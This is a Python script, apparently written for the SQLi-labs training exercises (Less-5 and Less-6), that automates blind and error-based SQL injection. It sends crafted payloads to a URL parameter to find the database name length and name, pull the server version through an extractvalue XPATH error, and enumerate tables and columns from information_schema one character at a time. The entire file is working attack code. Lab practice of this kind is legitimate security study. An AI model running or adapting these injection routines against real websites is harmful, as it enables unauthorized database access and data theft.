!/usr/bin/env python 
#coding:utf-8

'''
**以下脚本适合于第五课至第六课使用**
* Less-5: 基于错误的单引号字符型盲注 python less5_03.py  "http://192.168.32.142/sqli/Less-5/?id=1'"
* Less-6: 基于错误的双引号字符型盲注 python less5_03.py  'http://192.168.32.142/sqli/Less-6/?id=1"'
'''


import requests
import re,sys,time

class sqli():
    def __init__(self):
        self.url = sys.argv[1]
        self.db_name = ''
        self.db_len = 0
        self.tb_list= []
        self.tb_count = 0
        self.col_list = []
        self.db_version = ''
        self.Email_col = ''

    def getDBLen(self):
        try:
            for i in range(1,21):
                payload = ('and length(database())=%d'%i) + '%23'
                r = requests.get(self.url + payload)
                r.raise_for_status()
                r.encoding = r.apparent_encoding
                if 'You are in' in r.text:
                    self.db_len=i
                    break
        except:
            return "当前网站连接不成功"
        return self.db_len

    def getDBName(self):
        if self.getDBLen():
            try:
                for i in range(self.db_len+1):
                    for j in range(95,123):
                        payload = " and (left(database(),%d)='%s')--+" %(i,self.db_name+chr(j))
                        r = requests.get(self.url + payload)
                        r.raise_for_status()
                        r.encoding = r.apparent_encoding
                        if "You are in" in r.text:
                            self.db_name += chr(j)
                            break
            except:
                return "当前网站连接不成功"
            return self.db_name

    def getDBVer(self):
        try:
            payload ="  and extractvalue(1,concat(0x7e,(select @@version),0x7e))--+"
            r = requests.get(self.url + payload)
            r.raise_for_status()
            r.encoding = r.apparent_encoding
            if 'XPATH syntax error'  in r.text:
                self.version =','.join(re.findall(r"~(.*?)~",r.text))
                print('当前数据库版本号: %s' %str(self.version))
        except:
            return "当前网站连接不成功"
        return self.db_version

    def getTBCount(self):
        if self.getDBName():
            for i in range(1,21):
                payload = " and %d=(select count(table_name) \
                                 from information_schema.tables where table_schema='%s')--+" %(i,self.db_name)
                r = requests.get(self.url + payload)
                r.raise_for_status()
                if 'You are in'  in r.text:
                    self.tb_count = i
                    break
            print '数据库%s共有: %d张表' %(self.db_name,self.tb_count)
            return self.tb_count

    def getTBList(self):
        if self.getTBCount():
            for i in range(self.tb_count):
                self.tb_name =''
                for j in range(1,21):
                    payload = ' and ascii(substr((select table_name from information_schema.tables \
                                  where table_schema="%s" limit %d,1),%d,1))--+' % (self.db_name,i,j)
                    r = requests.get(self.url + payload)
                    if "You are in" not in r.text:
                        for k in range(1,j):
                            for l in range(95,123):
                                payload = ' and ascii(substr((select table_name from \
                                            information_schema.tables where table_schema=database() limit %d,1),%d,1))=%d--+' %(i,k,l)
                                r = requests.get(self.url + payload)
                                if "You are in" in r.text:
                                    self.tb_name += chr(l)
                        self.tb_list.append(self.tb_name)
                        break
            return self.tb_list
                           
    def getColName(self):
        if self.getTBList():
            for i in self.tb_list:
                for v in range(21):
                    payload = " and %d=(select count(column_name) from information_schema.columns where table_name='%s')--+" % (v, i)
                    r = requests.get(self.url + payload)
                    if "You are in" in r.text:
                        for j in range(v):
                            self.col_name=''
                            for k in range(1,21):
                                payload = ' and ascii(substr((select column_name from \
                                               information_schema.columns where table_name="%s" limit %d,1),%d,1))--+' % (i,j,k)
                                r = requests.get(self.url+payload)
                                if "You are in" not in r.text:
                                    column_len = k-1
                                    break
                                for l in range(95,123):
                                    payload = ' and ascii(substr((select column_name from \
                                                 information_schema.columns where table_name="%s" limit %d,1),%d,1))=%d--+' %(i,j,k,l)
                                    r = requests.get(self.url + payload)
                                    if "You are in" in r.text:
                                        self.col_name += chr(l)
                            self.col_list.append(self.col_name)
            return self.col_list
        
    def main(self):
        if self.getColName():
            print ('数据库表%s: %s' %(self.tb_list[0],str(self.col_list[0:2])))
            print ('数据库表%s: %s' %(self.tb_list[1],str(self.col_list[2:5])))
            print ('数据表表%s: %s' %(self.tb_list[2],str(self.col_list[5:9])))
            print ('数据库表%s: %s' %(self.tb_list[3],str(self.col_list[20:])))

if __name__ == '__main__':
    sql = sqli()
    sql.getDBVer()
    sql.main()
